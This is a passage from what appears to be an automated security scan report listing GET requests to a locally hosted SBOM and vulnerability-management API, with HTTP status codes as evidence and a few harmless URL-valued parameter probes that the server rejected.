  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/analysis-runs/10/
  * Node Name: `http://host.docker.internal:8000/api/analysis-runs/10/`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/analysis-runs/10/6949672724413791737
  * Node Name: `http://host.docker.internal:8000/api/analysis-runs/10/6949672724413791737`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/analysis-runs/10/export
  * Node Name: `http://host.docker.internal:8000/api/analysis-runs/10/export`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/analysis-runs/10/export/
  * Node Name: `http://host.docker.internal:8000/api/analysis-runs/10/export/`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/analysis-runs/10/export/5651434896052888574
  * Node Name: `http://host.docker.internal:8000/api/analysis-runs/10/export/5651434896052888574`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/analysis-runs/10/export/csv
  * Node Name: `http://host.docker.internal:8000/api/analysis-runs/10/export/csv`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/analysis-runs/10/export/csv/
  * Node Name: `http://host.docker.internal:8000/api/analysis-runs/10/export/csv/`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/analysis-runs/10/export/sarif
  * Node Name: `http://host.docker.internal:8000/api/analysis-runs/10/export/sarif`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/analysis-runs/10/export/sarif/
  * Node Name: `http://host.docker.internal:8000/api/analysis-runs/10/export/sarif/`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/analysis-runs/1751606386491082668
  * Node Name: `http://host.docker.internal:8000/api/analysis-runs/1751606386491082668`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/analysis-runs/compare
  * Node Name: `http://host.docker.internal:8000/api/analysis-runs/compare`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/analysis-runs/compare%3Frun_a=10&run_b=10
  * Node Name: `http://host.docker.internal:8000/api/analysis-runs/compare (run_a,run_b)`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/analysis-runs/compare%3Frun_a=http%253A%252F%252Fwww.google.com%252F&run_b=10
  * Node Name: `http://host.docker.internal:8000/api/analysis-runs/compare (run_a,run_b)`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/analysis-runs/compare/
  * Node Name: `http://host.docker.internal:8000/api/analysis-runs/compare/`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/analysis/
  * Node Name: `http://host.docker.internal:8000/api/analysis/`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/analysis/7479631931460320193
  * Node Name: `http://host.docker.internal:8000/api/analysis/7479631931460320193`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/auth
  * Node Name: `http://host.docker.internal:8000/api/auth`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/auth/
  * Node Name: `http://host.docker.internal:8000/api/auth/`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/auth/3589996283635230760
  * Node Name: `http://host.docker.internal:8000/api/auth/3589996283635230760`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/components
  * Node Name: `http://host.docker.internal:8000/api/components`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/components/
  * Node Name: `http://host.docker.internal:8000/api/components/`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/components/10
  * Node Name: `http://host.docker.internal:8000/api/components/10`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/components/10/
  * Node Name: `http://host.docker.internal:8000/api/components/10/`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/components/10/3047342753090412490
  * Node Name: `http://host.docker.internal:8000/api/components/10/3047342753090412490`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/components/10/lifecycle
  * Node Name: `http://host.docker.internal:8000/api/components/10/lifecycle`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/components/10/lifecycle/
  * Node Name: `http://host.docker.internal:8000/api/components/10/lifecycle/`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/components/10/lifecycle/1740218512499015862
  * Node Name: `http://host.docker.internal:8000/api/components/10/lifecycle/1740218512499015862`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/components/10/vulnerabilities
  * Node Name: `http://host.docker.internal:8000/api/components/10/vulnerabilities`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/components/10/vulnerabilities/
  * Node Name: `http://host.docker.internal:8000/api/components/10/vulnerabilities/`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/components/10/vulnerabilities/1113366494339815006
  * Node Name: `http://host.docker.internal:8000/api/components/10/vulnerabilities/1113366494339815006`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id
  * Node Name: `http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id/
  * Node Name: `http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id/`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id/8160080156619364106
  * Node Name: `http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id/8160080156619364106`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id/vex-override
  * Node Name: `http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id/vex-override`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `405`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id/vex-override/
  * Node Name: `http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id/vex-override/`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `405`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id/vex-override/2933723268592025666
  * Node Name: `http://host.docker.internal:8000/api/components/10/vulnerabilities/vulnerability_id/vex-override/2933723268592025666`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/components/7885046182110943597
  * Node Name: `http://host.docker.internal:8000/api/components/7885046182110943597`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/lifecycle
  * Node Name: `http://host.docker.internal:8000/api/lifecycle`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/lifecycle/
  * Node Name: `http://host.docker.internal:8000/api/lifecycle/`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/lifecycle/646104167762001777
  * Node Name: `http://host.docker.internal:8000/api/lifecycle/646104167762001777`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/lifecycle/component
  * Node Name: `http://host.docker.internal:8000/api/lifecycle/component`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/lifecycle/component/
  * Node Name: `http://host.docker.internal:8000/api/lifecycle/component/`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/products
  * Node Name: `http://host.docker.internal:8000/api/products`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/products/
  * Node Name: `http://host.docker.internal:8000/api/products/`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/products/10
  * Node Name: `http://host.docker.internal:8000/api/products/10`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/products/10/
  * Node Name: `http://host.docker.internal:8000/api/products/10/`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/products/10/8686431210460380116
  * Node Name: `http://host.docker.internal:8000/api/products/10/8686431210460380116`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/products/10/sboms
  * Node Name: `http://host.docker.internal:8000/api/products/10/sboms`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/products/10/sboms/
  * Node Name: `http://host.docker.internal:8000/api/products/10/sboms/`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/products/10/schedule
  * Node Name: `http://host.docker.internal:8000/api/products/10/schedule`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/products/10/schedule/
  * Node Name: `http://host.docker.internal:8000/api/products/10/schedule/`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/projects/10
  * Node Name: `http://host.docker.internal:8000/api/projects/10`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/projects/10/85578549720770301
  * Node Name: `http://host.docker.internal:8000/api/projects/10/85578549720770301`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/projects/10/delete-impact
  * Node Name: `http://host.docker.internal:8000/api/projects/10/delete-impact`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/projects/10/products
  * Node Name: `http://host.docker.internal:8000/api/projects/10/products`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/projects/10/reports
  * Node Name: `http://host.docker.internal:8000/api/projects/10/reports`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/projects/10/reports/
  * Node Name: `http://host.docker.internal:8000/api/projects/10/reports/`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/projects/10/reports/5643182030585894602
  * Node Name: `http://host.docker.internal:8000/api/projects/10/reports/5643182030585894602`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/projects/10/reports/fda-510k-sbom
  * Node Name: `http://host.docker.internal:8000/api/projects/10/reports/fda-510k-sbom`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/projects/10/reports/fda-510k-sbom/
  * Node Name: `http://host.docker.internal:8000/api/projects/10/reports/fda-510k-sbom/`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/projects/10/reports/fda-510k-sbom/4279451149898765395
  * Node Name: `http://host.docker.internal:8000/api/projects/10/reports/fda-510k-sbom/4279451149898765395`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/projects/10/schedule
  * Node Name: `http://host.docker.internal:8000/api/projects/10/schedule`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/projects/10/schedule/
  * Node Name: `http://host.docker.internal:8000/api/projects/10/schedule/`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/remediation
  * Node Name: `http://host.docker.internal:8000/api/remediation`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `405`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/remediation/
  * Node Name: `http://host.docker.internal:8000/api/remediation/`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `405`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/remediation/10
  * Node Name: `http://host.docker.internal:8000/api/remediation/10`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/remediation/10/
  * Node Name: `http://host.docker.internal:8000/api/remediation/10/`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/remediation/10/7757301120215911022
  * Node Name: `http://host.docker.internal:8000/api/remediation/10/7757301120215911022`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/remediation/10/history
  * Node Name: `http://host.docker.internal:8000/api/remediation/10/history`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/remediation/10/history/
  * Node Name: `http://host.docker.internal:8000/api/remediation/10/history/`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/remediation/9205539138415356932
  * Node Name: `http://host.docker.internal:8000/api/remediation/9205539138415356932`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/remediation/finding
  * Node Name: `http://host.docker.internal:8000/api/remediation/finding`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/remediation/finding/
  * Node Name: `http://host.docker.internal:8000/api/remediation/finding/`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/remediation/finding/10
  * Node Name: `http://host.docker.internal:8000/api/remediation/finding/10`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/remediation/finding/10/
  * Node Name: `http://host.docker.internal:8000/api/remediation/finding/10/`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/remediation/project
  * Node Name: `http://host.docker.internal:8000/api/remediation/project`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/remediation/project/
  * Node Name: `http://host.docker.internal:8000/api/remediation/project/`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/runs%3Fsbom_id=&project_id=&product_id=&run_status=&page=1&page_size=50&cursor=
  * Node Name: `http://host.docker.internal:8000/api/runs (cursor,page,page_size,product_id,project_id,run_status,sbom_id)`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/runs/10
  * Node Name: `http://host.docker.internal:8000/api/runs/10`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/runs/10/
  * Node Name: `http://host.docker.internal:8000/api/runs/10/`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/runs/10/8557719302179423691
  * Node Name: `http://host.docker.internal:8000/api/runs/10/8557719302179423691`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/runs/10/findings
  * Node Name: `http://host.docker.internal:8000/api/runs/10/findings`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/runs/10/findings%3Fseverity=&page=1&page_size=100
  * Node Name: `http://host.docker.internal:8000/api/runs/10/findings (page,page_size,severity)`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/runs/10/findings%3Fseverity=&page=http%253A%252F%252Fwww.google.com%252F&page_size=100
  * Node Name: `http://host.docker.internal:8000/api/runs/10/findings (page,page_size,severity)`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/runs/10/findings-enriched
  * Node Name: `http://host.docker.internal:8000/api/runs/10/findings-enriched`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/runs/10/findings-enriched%3Fseverity=&page=1&page_size=100
  * Node Name: `http://host.docker.internal:8000/api/runs/10/findings-enriched (page,page_size,severity)`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/runs/10/findings-enriched%3Fseverity=&page=http%253A%252F%252Fwww.google.com%252F&page_size=100
  * Node Name: `http://host.docker.internal:8000/api/runs/10/findings-enriched (page,page_size,severity)`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/runs/10/findings-enriched/
  * Node Name: `http://host.docker.internal:8000/api/runs/10/findings-enriched/`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/runs/10/findings/
  * Node Name: `http://host.docker.internal:8000/api/runs/10/findings/`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/runs/aggregate%3Fsbom_id=http%253A%252F%252Fwww.google.com%252F&project_id=
  * Node Name: `http://host.docker.internal:8000/api/runs/aggregate (project_id,sbom_id)`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/runs/recent%3Flimit=http%253A%252F%252Fwww.google.com%252F
  * Node Name: `http://host.docker.internal:8000/api/runs/recent (limit)`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/runs/search%3Fq=q&limit=http%253A%252F%252Fwww.google.com%252F
  * Node Name: `http://host.docker.internal:8000/api/runs/search (limit,q)`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sbom-validation-sessions
  * Node Name: `http://host.docker.internal:8000/api/sbom-validation-sessions`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sbom-validation-sessions/
  * Node Name: `http://host.docker.internal:8000/api/sbom-validation-sessions/`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sbom-validation-sessions/9034430037788949594
  * Node Name: `http://host.docker.internal:8000/api/sbom-validation-sessions/9034430037788949594`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sbom-validation-sessions/session_id
  * Node Name: `http://host.docker.internal:8000/api/sbom-validation-sessions/session_id`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sbom-validation-sessions/session_id/
  * Node Name: `http://host.docker.internal:8000/api/sbom-validation-sessions/session_id/`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sbom-validation-sessions/session_id/4359340955656174552
  * Node Name: `http://host.docker.internal:8000/api/sbom-validation-sessions/session_id/4359340955656174552`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sbom-validation-sessions/session_id/ai
  * Node Name: `http://host.docker.internal:8000/api/sbom-validation-sessions/session_id/ai`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sbom-validation-sessions/session_id/ai/
  * Node Name: `http://host.docker.internal:8000/api/sbom-validation-sessions/session_id/ai/`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sbom-validation-sessions/session_id/ai/2850879350349971326
  * Node Name: `http://host.docker.internal:8000/api/sbom-validation-sessions/session_id/ai/2850879350349971326`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sbom-validation-sessions/session_id/content
  * Node Name: `http://host.docker.internal:8000/api/sbom-validation-sessions/session_id/content`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sbom-validation-sessions/session_id/content%3Fsource=repair_draft&offset=0&limit=65536
  * Node Name: `http://host.docker.internal:8000/api/sbom-validation-sessions/session_id/content (limit,offset,source)`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sbom-validation-sessions/session_id/content%3Fsource=http%253A%252F%252Fwww.google.com%252F&offset=0&limit=65536
  * Node Name: `http://host.docker.internal:8000/api/sbom-validation-sessions/session_id/content (limit,offset,source)`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sbom-validation-sessions/session_id/content-lines
  * Node Name: `http://host.docker.internal:8000/api/sbom-validation-sessions/session_id/content-lines`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sbom-validation-sessions/session_id/content-lines%3Fsource=repair_draft&start_line=1&line_count=500
  * Node Name: `http://host.docker.internal:8000/api/sbom-validation-sessions/session_id/content-lines (line_count,source,start_line)`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sbom-validation-sessions/session_id/content-lines%3Fsource=http%253A%252F%252Fwww.google.com%252F&start_line=1&line_count=500
  * Node Name: `http://host.docker.internal:8000/api/sbom-validation-sessions/session_id/content-lines (line_count,source,start_line)`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sbom-validation-sessions/session_id/content-lines/
  * Node Name: `http://host.docker.internal:8000/api/sbom-validation-sessions/session_id/content-lines/`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sbom-validation-sessions/session_id/content/
  * Node Name: `http://host.docker.internal:8000/api/sbom-validation-sessions/session_id/content/`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sbom-validation-sessions/session_id/content/8468471561729497349
  * Node Name: `http://host.docker.internal:8000/api/sbom-validation-sessions/session_id/content/8468471561729497349`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sbom-validation-sessions/session_id/content/chunk
  * Node Name: `http://host.docker.internal:8000/api/sbom-validation-sessions/session_id/content/chunk`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sbom-validation-sessions/session_id/content/chunk%3Fsource=repair_draft&offset=0&limit=65536
  * Node Name: `http://host.docker.internal:8000/api/sbom-validation-sessions/session_id/content/chunk (limit,offset,source)`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sbom-validation-sessions/session_id/content/chunk%3Fsource=http%253A%252F%252Fwww.google.com%252F&offset=0&limit=65536
  * Node Name: `http://host.docker.internal:8000/api/sbom-validation-sessions/session_id/content/chunk (limit,offset,source)`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sbom-validation-sessions/session_id/content/chunk/
  * Node Name: `http://host.docker.internal:8000/api/sbom-validation-sessions/session_id/content/chunk/`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sbom-validation-sessions/session_id/content/lines
  * Node Name: `http://host.docker.internal:8000/api/sbom-validation-sessions/session_id/content/lines`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sbom-validation-sessions/session_id/content/lines%3Fsource=repair_draft&start_line=1&line_count=500
  * Node Name: `http://host.docker.internal:8000/api/sbom-validation-sessions/session_id/content/lines (line_count,source,start_line)`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sbom-validation-sessions/session_id/content/lines%3Fsource=http%253A%252F%252Fwww.google.com%252F&start_line=1&line_count=500
  * Node Name: `http://host.docker.internal:8000/api/sbom-validation-sessions/session_id/content/lines (line_count,source,start_line)`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `422`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sbom-validation-sessions/session_id/content/lines/
  * Node Name: `http://host.docker.internal:8000/api/sbom-validation-sessions/session_id/content/lines/`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sbom-validation-sessions/session_id/download-original
  * Node Name: `http://host.docker.internal:8000/api/sbom-validation-sessions/session_id/download-original`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
* URL: http://host.docker.internal:8000/api/sbom-validation-sessions/session_id/download-original/
  * Node Name: `http://host.docker.internal:8000/api/sbom-validation-sessions/session_id/download-original/`
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `404`
  * Other Info: ``
